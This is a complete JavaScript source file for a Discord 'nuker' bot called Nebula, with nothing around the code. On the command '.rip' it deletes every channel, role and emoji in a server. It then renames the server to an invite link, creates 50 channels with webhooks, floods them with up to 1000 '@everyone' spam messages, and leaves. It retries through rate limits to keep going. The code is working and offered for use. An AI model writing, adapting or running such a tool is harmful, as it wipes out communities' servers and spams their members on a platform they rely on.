const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content !== '.rip' || message.author.bot) return;

  const guild = message.guild;
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const channelName = 'neb-was-here';
  const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png ';

  try {
    console.log(`🎯 Targeting server: ${guild.name}`);

    let didSomething = false;

    // Step 1: Delete channels
    try {
      console.log('🧹 Deleting channels...');
      await Promise.all(guild.channels.cache.map(async (channel) => {
        const result = await handleRateLimit(() =>
          channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
        );
        if (result) {
          console.log(`🗑️ Deleted channel: ${channel.name}`);
          didSomething = true;
        }
      }));
    } catch (err) {
      console.warn('⚠️ Failed to delete channels:', err.message);
    }

    // Step 2: Delete roles
    try {
      console.log('🛡️ Deleting roles...');
      await Promise.all(guild.roles.cache.map(async (role) => {
        if (role.name !== '@everyone' && !role.managed) {
          const result = await handleRateLimit(() =>
            role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
          );
          if (result) {
            console.log(`🗑️ Deleted role: ${role.name}`);
            didSomething = true;
          }
        }
      }));
    } catch (err) {
      console.warn('⚠️ Failed to delete roles:', err.message);
    }

    // Step 3: Delete emojis
    try {
      console.log('🖼️ Deleting emojis...');
      await Promise.all(guild.emojis.cache.map(async (emoji) => {
        const result = await handleRateLimit(() =>
          emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
        );
        if (result) {
          console.log(`🗑️ Deleted emoji: ${emoji.name}`);
          didSomething = true;
        }
      }));
    } catch (err) {
      console.warn('⚠️ Failed to delete emojis:', err.message);
    }

    // Step 4: Rename server
    try {
      console.log('📛 Renaming server...');
      await handleRateLimit(() =>
        guild.edit({ name: 'discord.gg/migh' }).catch(e => console.warn(`Rename fail: ${e.message}`))
      );
      console.log('✅ Server renamed.');
      didSomething = true;
    } catch (err) {
      console.warn('⚠️ Failed to rename server:', err.message);
    }

    // Step 5: Create new channels
    const createdChannels = [];
    try {
      console.log('🆕 Creating new channels...');
      for (let i = 0; i < 50; i++) {
        const channel = await handleRateLimit(() =>
          guild.channels.create({ name: `${channelName}-${i + 1}` })
            .catch(e => console.warn(`Channel create fail: ${e.message}`))
        );
        if (channel) {
          createdChannels.push(channel);
          console.log(`✅ Created channel: ${channel.name}`);
          didSomething = true;
        }
      }
    } catch (err) {
      console.warn('⚠️ Failed to create channels:', err.message);
    }

    if (createdChannels.length === 0) {
      console.log('❌ No channels created. Skipping spam.');
    } else {
      // Step 6: Create webhooks
      const webhooks = [];
      try {
        console.log('📎 Creating webhooks...');
        for (const channel of createdChannels) {
          const hook = await handleRateLimit(() =>
            channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar })
              .catch(e => console.warn(`Webhook create fail: ${e.message}`))
          );
          if (hook) {
            webhooks.push(hook);
            console.log(`✅ Created webhook in: ${channel.name}`);
            didSomething = true;
          }
        }
      } catch (err) {
        console.warn('⚠️ Failed to create webhooks:', err.message);
      }

      if (webhooks.length === 0) {
        console.log('❌ No webhooks created. Skipping spam.');
      } else {
        // Step 7: Spam messages
        const totalMessages = 1000;
        const perHook = Math.ceil(totalMessages / webhooks.length);
        let sent = 0;

        console.log(`🔥 Starting spam with ${webhooks.length} webhooks...`);

        const sendBatch = webhooks.map(webhook => async () => {
          for (let i = 0; i < perHook && sent < totalMessages; i++) {
            try {
              await handleRateLimit(() => webhook.send(spamMessage));
              sent++;
              if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
            } catch (err) {
              console.error(`⚠️ Webhook send failed: ${err.message}`);
            }
            await new Promise(r => setTimeout(r, 50)); // Small delay to avoid hitting limits hard
          }
        });

        await Promise.all(sendBatch.map(fn => fn()));
        console.log(`✅ Sent ${sent}/${totalMessages} spam messages.`);
        didSomething = true;
      }
    }

    // Step 8: Leave server
    try {
      await handleRateLimit(() => guild.leave());
      console.log('🚪 Left server.');
    } catch (err) {
      console.warn('⚠️ Failed to leave server:', err.message);
    }

    if (!didSomething) {
      console.error('🚫 Could not perform any actions on this server.');
      await message.channel.send('🚫 Could not perform any actions on this server.');
    } else {
      console.log('✅ Successfully completed operation.');
      await message.channel.send('✅ Successfully nuked server.');
    }

  } catch (err) {
    console.error('🚨 Critical error during operation:', err.message);
    await message.channel.send(`❌ Error occurred: ${err.message}`);
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
